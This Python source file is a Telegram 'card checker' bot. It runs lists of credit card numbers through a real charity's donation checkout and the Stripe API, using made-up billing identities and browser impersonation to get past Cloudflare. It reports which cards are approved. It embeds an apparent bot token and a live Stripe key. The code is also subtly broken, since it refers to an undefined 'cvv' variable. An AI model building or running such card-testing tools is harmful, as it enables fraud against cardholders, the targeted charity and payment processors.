import json
import random
import re
import string
import time
from urllib.parse import quote_plus
from curl_cffi import requests
import telebot

TELEGRAM_BOT_TOKEN = "8664861867:AAF5Wq79aekFKDcE6vFT2jFO_3w4jjFgLmk"
SECRET_CODE = "Zenmods123"
authorized_users = set()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="Markdown")

HTTP_TIMEOUT = 30

FIRST_NAMES = [
    'James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard',
    'Joseph', 'Thomas', 'Charles', 'Emily', 'Emma', 'Olivia', 'Ava',
    'Isabella', 'Sophia', 'Mia', 'Charlotte', 'Amelia', 'Harper',
]
LAST_NAMES = [
    'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller',
    'Davis', 'Wilson', 'Taylor', 'Anderson', 'Thomas', 'Jackson', 'White',
    'Harris', 'Martin', 'Thompson', 'Moore', 'Young', 'Allen',
]
STREETS = [
    'Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine Rd', 'Elm St',
    'Washington Blvd', 'Park Ave', 'Lake Dr', 'Hill Rd',
]
CITIES_STATES = [
    ('Phoenix', 'AZ', '850'),
    ('Los Angeles', 'CA', '900'),
    ('Houston', 'TX', '770'),
    ('Chicago', 'IL', '606'),
    ('Dallas', 'TX', '752'),
    ('San Antonio', 'TX', '782'),
    ('San Diego', 'CA', '921'),
    ('Jacksonville', 'FL', '322'),
    ('Austin', 'TX', '787'),
    ('Columbus', 'OH', '432'),
]

STRIPE_PK = (
    'pk_live_51RJd5fGlfOdBh4Nl2YUzFnY6zYb5IEAkHYSatP353K0wRioIydSEkrK'
    'fWMrApQmyNrPafBOqLy4KQ4a5O3aVODi500IGgjyNG6'
)

ST1_CHARGED_RESPONSE = "Payment Success"

def classify_gate_response(text):
    low = text.lower()
    if any(k in low for k in ["succeeded", "success", "thank you", "order_id", "charged"]):
        return "charged", "Payment Success", "charged"
    elif any(k in low for k in ["insufficient_funds", "insufficient funds"]):
        return "approved", "Your card has insufficient funds.", "insufficient_funds"
    elif any(k in low for k in ["security_code", "cvc", "incorrect_cvc"]):
        return "approved", "Your card's security code is incorrect.", "incorrect_cvc"
    elif any(k in low for k in ["expired_card", "expiration"]):
        return "declined", "Your card has expired.", "expired_card"
    else:
        return "declined", text[:100], "declined"

def _http_error(exc) -> dict:
    low = str(exc).lower()
    if "timed out" in low or "timeout" in low:
        return {"status": "ERROR", "response": "Request timed out", "time": "0s"}
    return {"status": "ERROR", "response": str(exc)[:200], "time": "0s"}

def _process_card_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> dict:
    started = time.perf_counter()
    if len(yy) == 2:
        yy = "20" + yy[-2:]
    mm = mm.zfill(2)

    try:
        first_name = random.choice(FIRST_NAMES)
        last_name = random.choice(LAST_NAMES)
        full_name = f"{first_name} {last_name}"
        email_user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        email = f"{email_user}@gmail.com"
        street_num = random.randint(100, 99999)
        street = random.choice(STREETS)
        address = f"{street_num} {street}"
        city, state, zip_prefix = random.choice(CITIES_STATES)
        zip_code = zip_prefix + str(random.randint(10, 99))

        session = requests.Session(impersonate="chrome120")
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}

        init_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
        }
        init_resp = session.get(
            'https://forcesforchange.org/donate/',
            headers=init_headers,
            timeout=HTTP_TIMEOUT,
        )
        if init_resp.status_code >= 400:
            elapsed = f"{time.perf_counter() - started:.2f}s"
            return {
                "status": "ERROR",
                "response": f"Donate page HTTP {init_resp.status_code} (Cloudflare Bypass Blocked)",
                "time": elapsed,
            }

        product_id_match = (
            re.search(r'["\']add-to-cart["\']\s*value=["\'](\d+)["\']', init_resp.text)
            or re.search(r'\?add-to-cart=(\d+)', init_resp.text)
            or re.search(r'"product_id"\s*:\s*(\d+)', init_resp.text)
        )
        product_id = product_id_match.group(1) if product_id_match else None

        if product_id:
            session.post(
                'https://forcesforchange.org/',
                params={'wc-ajax': 'add_to_cart'},
                headers={
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://forcesforchange.org',
                    'referer': 'https://forcesforchange.org/donate/',
                    'x-requested-with': 'XMLHttpRequest',
                },
                data={'product_id': product_id, 'quantity': '1'},
                timeout=HTTP_TIMEOUT,
            )
        else:
            add_to_cart_match = re.search(
                r'<form[^>]+class="[^"]*cart[^"]*"[^>]*>(.*?)</form>',
                init_resp.text, re.DOTALL,
            )
            if add_to_cart_match:
                inputs = re.findall(
                    r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
                    add_to_cart_match.group(1),
                )
                session.post(
                    'https://forcesforchange.org/donate/',
                    headers={
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://forcesforchange.org',
                        'referer': 'https://forcesforchange.org/donate/',
                    },
                    data=dict(inputs),
                    timeout=HTTP_TIMEOUT,
                )

        checkout_page = session.get(
            'https://forcesforchange.org/checkout/',
            headers=init_headers,
            timeout=HTTP_TIMEOUT,
        )

        nonce_match = (
            re.search(r'"woocommerce-process-checkout-nonce"\s*value="([^"]+)"', checkout_page.text)
            or re.search(r'"checkout_nonce"\s*:\s*"([^"]+)"', checkout_page.text)
            or re.search(r'"woocommerce-process-checkout-nonce"\s*value="([^"]+)"', init_resp.text)
            or re.search(r'"checkout_nonce"\s*:\s*"([^"]+)"', init_resp.text)
        )
        nonce = nonce_match.group(1) if nonce_match else '716ee815cf'

        stripe_mid = session.cookies.get('__stripe_mid', 'c1ccf2d6-5b18-4fdc-a355-a6238ee7137bfb20e4')
        stripe_sid = session.cookies.get('__stripe_sid', 'd75866ab-c96e-4246-a6f5-7ff152f406ebcef345')

        stripe_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
        }

        stripe_data = (
            f'billing_details[name]={quote_plus(full_name)}'
            f'&billing_details[email]={quote_plus(email)}'
            f'&billing_details[address][city]={quote_plus(city)}'
            '&billing_details[address][country]=US'
            f'&billing_details[address][line1]={quote_plus(address)}'
            '&billing_details[address][line2]='
            f'&billing_details[address][postal_code]={zip_code}'
            f'&billing_details[address][state]={state}'
            '&type=card'
            f'&card[number]={cc}'
            f'&card[cvc]={cvv}'
            f'&card[exp_year]={yy}'
            f'&card[exp_month]={mm}'
            '&allow_redisplay=unspecified'
            f'&guid={stripe_mid}'
            f'&muid={stripe_mid}'
            f'&sid={stripe_sid}'
            f'&key={STRIPE_PK}'
        )

        stripe_resp = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data,
            timeout=HTTP_TIMEOUT,
        )
        try:
            stripe_json = stripe_resp.json()
        except Exception as je:
            elapsed = f"{time.perf_counter() - started:.2f}s"
            return {"status": "ERROR", "response": f"Stripe JSON error: {je}", "time": elapsed}

        payment_method_id = stripe_json.get('id', '')
        elapsed = f"{time.perf_counter() - started:.2f}s"

        if not payment_method_id or not payment_method_id.startswith('pm_'):
            err_msg = (
                stripe_json.get('error', {}).get('message')
                or stripe_json.get('error', {}).get('code')
                or 'Stripe tokenization failed'
            )
            return {"status": "DECLINED", "response": err_msg, "time": elapsed}

        checkout_headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://forcesforchange.org',
            'referer': 'https://forcesforchange.org/donate/',
            'x-requested-with': 'XMLHttpRequest',
        }

        checkout_data = (
            f'billing_email={quote_plus(email)}'
            f'&billing_first_name={quote_plus(first_name)}'
            f'&billing_last_name={quote_plus(last_name)}'
            '&billing_country=US'
            f'&billing_address_1={quote_plus(address)}'
            f'&billing_city={quote_plus(city)}'
            f'&billing_state={state}'
            f'&billing_postcode={zip_code}'
            '&payment_method=stripe'
            f'&woocommerce-process-checkout-nonce={nonce}'
            f'&wc-stripe-payment-method={payment_method_id}'
        )

        checkout_resp = session.post(
            'https://forcesforchange.org/',
            params={'wc-ajax': 'checkout'},
            headers=checkout_headers,
            data=checkout_data,
            timeout=HTTP_TIMEOUT,
        )

        elapsed = f"{time.perf_counter() - started:.2f}s"

        try:
            cj = checkout_resp.json()
        except Exception:
            return {
                "status": "ERROR",
                "response": checkout_resp.text[:200],
                "time": elapsed,
            }

        if cj.get("result") == "success" or cj.get("redirect") or cj.get("order_id"):
            return {
                "status": "APPROVED",
                "response": ST1_CHARGED_RESPONSE,
                "time": elapsed,
            }

        msg = str(cj.get("messages") or cj.get("message") or cj.get("code") or "Declined")
        clean = re.sub(r"<[^>]+>", "", msg).strip()
        st, out_msg, _ = classify_gate_response(clean)
        
        if st in ["charged", "approved"]:
            return {"status": "APPROVED", "response": out_msg or clean, "time": elapsed}
        return {"status": "DECLINED", "response": out_msg or clean, "time": elapsed}

    except Exception as exc:
        elapsed = f"{time.perf_counter() - started:.2f}s"
        err = _http_error(exc)
        err["time"] = elapsed
        return err

def check_single_cc(cc_str: str):
    parts = cc_str.replace("/", "|").split("|")
    if len(parts) < 4:
        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_str}\nReason: Invalid format structure"
    cc, mm, yy, cvc = [p.strip() for p in parts[:4]]
    res = _process_card_sync(cc, mm, yy, cvc)
    
    status = res.get("status")
    response_msg = res.get("response")
    time_taken = res.get("time")

    if status == "APPROVED":
        return f"ZENMODS CHECKER ⚡\nApproved ✅\n{cc_str}\nResponse: {response_msg}\nTime: {time_taken}"
    else:
        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_str}\nReason: {response_msg}\nTime: {time_taken}"

def process_bulk_file(chat_id, file_content):
    lines = [line.strip() for line in file_content.decode("utf-8").splitlines() if line.strip()]
    total_cards = len(lines)

    if total_cards == 0:
        bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
        return

    bot.send_message(chat_id, f"⚡ **Zenmods Cloudflare Bypass Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Checking strictly 1 by 1 in real-time...")

    for index, card_line in enumerate(lines, start=1):
        res = check_single_cc(card_line)
        bot.send_message(chat_id, f"📌 **Result [{index}/{total_cards}]**:\n\n{res}")
        time.sleep(2)

    bot.send_message(chat_id, "🏁 **All cards checked successfully!**")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to Zenmods Checker Bot! Send /auth <code > to authorize or upload a text file.")

@bot.message_handler(commands=['auth'])
def authorize_user(message):
    try:
        parts = message.text.split()
        if len(parts) > 1 and parts[1] == SECRET_CODE:
            authorized_users.add(message.chat.id)
            bot.reply_to(message, "✅ Authorization successful! You can now send card lists.")
        else:
            bot.reply_to(message, "❌ Invalid secret code!")
    except Exception as e:
        bot.reply_to(message, "⚠️ An error occurred.")

@bot.message_handler(commands=['chk'])
def handle_single_card_cmd(message):
    chat_id = message.chat.id
    if chat_id not in authorized_users:
        bot.reply_to(message, "⛔ You are not authorized! Use `/auth <secret_code>` first.")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Format: `/chk card|mm|yy|cvv`")
        return
    
    card_line = parts[1].strip()
    bot.send_message(chat_id, "🔍 Checking single card...")
    res = check_single_cc(card_line)
    bot.send_message(chat_id, f"📌 **Single Card Report:**\n\n{res}")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    if chat_id not in authorized_users:
        bot.reply_to(message, "⛔ You are not authorized! Use `/auth <secret_code>` first.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        process_bulk_file(chat_id, downloaded_file)
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error processing file: {str(e)}")

if __name__ == "__main__":
    bot.infinity_polling()
